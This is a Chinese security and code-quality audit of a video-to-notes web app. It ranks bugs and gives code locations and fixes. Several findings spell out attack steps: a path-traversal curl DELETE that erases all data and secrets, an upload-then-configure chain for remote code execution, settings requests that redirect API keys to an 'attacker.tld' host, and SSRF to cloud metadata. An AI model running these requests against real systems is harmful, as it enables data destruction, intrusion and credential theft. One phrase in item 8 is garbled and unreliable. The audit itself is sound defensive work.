# video2note 代码审查报告

- 审查对象：`99d16aa`（2026-10-12）
- 范围：`core/`（4810 行）、`static/`（1762 行）
- 方法：四路并行静态审查 + **关键结论均实测/代码级验证**
- 标注含义：**【已实测】**=跑脚本验证过；**【代码确认】**=读代码+路径推导确认；无标注=静态审查结论

---

## 一、必须立刻修（P0）

### P0-1　`DELETE /api/tasks/{tid}` 未校验 tid → 一个请求删光全部数据 + 密钥 【已实测】

- 位置：`core/main.py:538-543`

```python
@app.delete("/api/tasks/{tid}")
def delete_task(tid: str):
    ok = store.remove(tid)
    shutil.rmtree(MEDIA_DIR / tid, ignore_errors=True)   # tid 未做任何校验
```

实测推导：

| 项 | 结果 |
|---|---|
| 路由正则 | `^/api/tasks/(?P<tid>[^/]+)$` — `..` **匹配成功** |
| `MEDIA_DIR / ".."` 解析 | `...\data\media\..` → **`rmtree` 目标 = DATA_DIR 本身** |

攻击者执行：

```bash
curl -X DELETE --path-as-is http://host/api/tasks/..
```

一次性删除 `tasks/`、`media/`、`settings.json`、`secrets.json`、`cookies.txt` —— **全部历史任务 + 全部密钥同时消失**，且 `ignore_errors=True` 不留任何痕迹。

> 修复：加 `if not re.fullmatch(r"[0-9a-f]{12}", tid): raise HTTPException(404)`。**改动最小、收益最大。**

---

### P0-2　切片线程异常 → 转写永久死锁（上次修死锁只修了一半）【已实测】

- 位置：`core/pipeline.py:235`（`pump_done.set()` 在 `for` 循环后，不在 `finally`）

`pump()` 若抛异常，`pump_done` 永不置位；而 `finished.set()` 在 `run()` 返回后才执行，形成互等死锁。

实测结果：

```
损坏音频 -> iter_chunks 抛 AudioError: 无法读取音频时长
pump 崩后 consume 6s 内退出? False | pump_done = False
>> 结论: consume 永久阻塞(死锁)
```

后果：`_executor` 只有 **2 个 worker**（`pipeline.py:21`），**两次触发即让全站新任务永久排队**，只能重启进程。

> 修复：`pump_done.set()` 移进 `finally:`。

---

### P0-3　无鉴权 + `ffmpeg_path` 可控 → 任意代码执行（RCE）【代码确认】

- 位置：`core/config.py:625-634`（`ff_bin`）、`core/audio.py:22-27`（`_run`）

`ff_bin` **只做 `p.exists()` 判断**就返回该路径，不校验文件名是否为 ffmpeg/ffprobe。攻击链（全部未授权）：

1. `POST /api/tasks/upload` 上传 `x.exe` → 落盘 `MEDIA_DIR/<tid>/source.exe`（上传端点只取后缀，`.exe` 合法）
2. `POST /api/settings {"values":{"ffmpeg_path":"<...>/source.exe"}}`
3. 健康线程每 20 秒调 `check_ffmpeg()` → `subprocess.run([该exe, "-version"])` **自动执行**

无需任何任务、无需交互，进程权限即服务权限（Docker 常为 root）。

> 修复：`ffmpeg_path` 必须校验是可执行文件且 basename 匹配 `ffmpeg|ffprobe`（含 `.exe`），否则回落 PATH。

---

### P0-4　无鉴权 + base_url 可控 → API Key 外带【代码确认】

- 位置：`core/main.py:228-247`、`core/asr.py:67-73`、`core/llm.py:115-120`

`asr_base_url` / `llm_base_url` 属**非敏感项**，可被随意改写；而 `asr_api_key` 保持原值。攻击者只需改接收方：

```
POST /api/settings {"values":{"asr_base_url":"http://attacker.tld"}}
POST /api/tasks {"url":"..."}     -> 服务端带着 Bearer 真实 Token POST 到攻击者
```

隐蔽性极高：`public_settings()` 仍显示 `_configured.asr = true`。`llm_base_url` 同理泄露 LLM Key 与全部转写正文。

---

### P0-5　媒体文件 4.3 GB 且无任何清理机制【已实测】

```
media 总占用 : 4280.7 MB   (45 个任务目录)
孤儿媒体目录 : 2 个 / 95.2 MB
含 audio.mp3 : 36        残留 chunks : 1
```

无任何 TTL、容量上限或启动时孤儿回收。文件仅在用户显式删除任务时才消失（而显式删除还有 P0-1 的问题）。长期运行实例磁盘单调增长，写满后所有新任务以 `AudioError` 失败。

叠加 **上传无体积/类型限制**（`main.py:415-483` 无 Content-Length 校验、无累积上限），单个请求即可打满磁盘。

---

## 二、明显功能缺陷（P1）

| # | 问题 | 位置 | 触发条件与后果 |
|---|---|---|---|
| 6 | **删除运行中任务 → 任务“复活”** | `main.py:538` / `store.py:124` | 未置 cancel、不等 worker；worker 继续 `store.save()` 把 JSON 写回 → 已删任务重现；而媒体目录已被删，下载/切片与已删目录互踩 |
| 7 | **LLM 整理失败 → 重试重跑全部 ASR** | `pipeline.py:557-577` | `_catch_polish` 未设 `failed_stage="polishing"`，retry 落到全流程分支 → 重复调用几十次 ASR，与 docstring 承诺矛盾 |
| 8 | **智能续跑无条件复用损坏媒体** | `pipeline.py:607-620` | `_existing_media` 只判 `is_file()`，不校验大小/时长/可解码；半截 audio.mp3 导致误floor黄瓜径进入 P0-2 死锁。无强制重下载出口，用户陷入死循环 |
| 9 | **重连退避完全失效** | `app.js:547-563` | 553 行 `retryAt.has()` 提前 return → 556 行 `get()` 必 undefined → `n` 恒为 1 → `wait` 恒 1200ms。`RECONNECT_MAX=15000` 是死代码，后端挂掉时按 ~50 次/分钟无限重连 |
| 10 | **重连定时器句柄未登记** | `app.js:559` / `27-32` | `stopFollow` 不持有/清除该 `setTimeout`；切任务后仍会为旧任务新建 SSE + 轮询器 → 孤儿连接吃满浏览器 6 连接上限（正是“顶栏永远检测中”的成因） |
| 11 | **uploadPct 全局污染** | `app.js:66,742,750` | 上传后（含失败）恒为 100，`selectTask` 不重置 → 此后查看**任何**历史任务都展开 6 行 100% 进度条；链接任务也显示“文件上传 100%” |
| 12 | **复制按钮复制的稿不对** | `app.js:1079` | 屏幕显示 `noteForStyle(t,curStyle)`，复制固定用 `t.note`；多风格切换后**看到 A 稿、复制到 B 稿** |
| 13 | **历史列表滚动位置被反复重置** | `app.js:239-248` | `renderHistory` 每次 `innerHTML` 全量重建，SSE 每 0.8s 一次 → 任务运行中用户无法向下滚动查看/删除较早记录 |
| 14 | **SSE 日志 500 条后永久停推** | `main.py:594` / `store.py:52` | `events` 截断保留最后 500 条，但 `last` 是单调递增下标 → 追到 500 后 `500 < 500` 恒假，此后该连接收不到任何日志 |
| 15 | **chunk_seconds=0 → 无限循环写盘** | `pipeline.py:168` / `audio.py:307` | `int("0")==0` 未被拦截，`offset` 不推进 → 无限 fork ffmpeg 写 `part_XXX.mp3`；两个此类任务堵死线程池 |
| 16 | **max_concurrency 非数字 → 全任务失败** | `pipeline.py:185` / `llm.py:445` | 无 try/except（同函数内其它项都有），设成 "4.5" 后**每个新任务**抛 ValueError |
| 17 | **yt-dlp / ffmpeg 无总体超时** | `downloader.py:295` / `audio.py:22` | 只有 `socket_timeout`；`subprocess.run` 全无 `timeout=`（对比 `main.py:337` 的 git 反而带了）。挂死即占满 2 个 worker |
| 18 | **SSRF** | `main.py:405` | url 只校验 `startswith("http")`，可请求 `169.254.169.254` 云元数据 / 内网面板；报错经 `t.error` 部分回显 |
| 19 | **删除弹窗标题恒为“(无标题)”** | `app.js:809` | Task 无 `title` 字段，标题在 `meta.title`；确认删除时无法分辨删的是哪条 |
| 20 | **上传失败创建幽灵任务** | `app.js:191-194` | `xhr.onload` 不检查 `xhr.status`，非 2xx 但 JSON body 时 `resolve({detail})` → `afterCreate(undefined)` 塞入 `id=undefined` 记录，`catch` 永不执行且不报错 |
| 21 | **取消不能真正取消** | `pipeline.py:95,281,120` | `_cancel` 检查点不在 run/pump/consume 内；`ex.shutdown(wait=True)` 等所有 ASR 跑完；`finally` 还立刻删除在途 chunks 导致 ASR 读空文件失败 |

---

## 三、健壮性 / 次要（P2）

| # | 问题 | 位置 | 说明 |
|---|---|---|---|
| 22 | `store.save` 非原子写 | `store.py:124` | 无 tmp+replace，崩溃留半截 JSON → `get()` 返回 None → 任务从 UI 静默消失 |
| 23 | `store._lock` 只保护读侧 | `store.py:14` | pipeline 全文无一处 `with store._lock`；`main.py:566` 注释声称的锁保护实际不存在，并发时 dict 迭代可能抛 RuntimeError |
| 24 | 导出临时文件永不删除 | `main.py:191` | 每次导出落 `.export` 文件无回收；`exporters` 另写 `DATA_DIR/export/` 同样无清理 |
| 25 | `migrate_secrets` 可能吃掉真密钥 | `config.py:213-230` | `setdefault` 后无条件从 settings.json 删除，若 secrets.json 已有空值同名键则真 Cookie/Token 静默丢失且无备份 |
| 26 | cookies.txt 无 0600 权限 | `config.py:456` | secrets.json 有 `private=True` 走 0600，同为登录态凭据的 cookies.txt 在 POSIX 上是默认 0644 |
| 27 | Range 头 ValueError → 500 | `main.py:685` | `int(s)` 未捕获异常，`Range: bytes=abc` 即打出 500 |
| 28 | Content-Disposition 未转义 | `main.py:683` | name 校验未挡 `"`，可参数注入（CRLF 被 h11 拦下，不构成响应拆分） |
| 29 | `_polish_locks` 只增不减 | `pipeline.py:335` | 无 evict，随任务数无界增长（量级小） |
| 30 | 转写循环 O(n²) 写盘 | `pipeline.py:204` | 每片完成都全量 `segments_to_text` + 全量 JSON 写盘，长视频放大明显 |
| 31 | `ensureVideo` 缓存守卫失效 | `app.js:350-358` | 存入 key 与下次计算值永不相等，每次 render 都重建，准备阶段以高频重建占位 div |

---

## 四、建议修复顺序

1. **`main.py:538` 加 tid 白名单校验**（一行改动，关掉最严重的数据毁灭风险）
2. **`pipeline.py:235` 把 `pump_done.set()` 移入 `finally`**（一行，彻底消除死锁）
3. **加全局鉴权**（一个 `V2N_ACCESS_TOKEN` + `Depends` 即可同时关闭 P0-3/P0-4/SSRF/越权读写）
4. **收紧 `ffmpeg_path` 校验**（basename 必须匹配 ffmpeg/ffprobe）
5. **媒体目录 TTL/GC + 上传体积上限**（防止磁盘写满）
6. **前端三件套**：退避计数修正、重连句柄登记清理、`uploadPct` 在 `selectTask` 重置
7. **`_catch_polish` 补 `failed_stage="polishing"`** + **`_existing_media` 加完整性校验**（终结两类重试死循环）
8. 其余 P1/P2 按表逐项处理
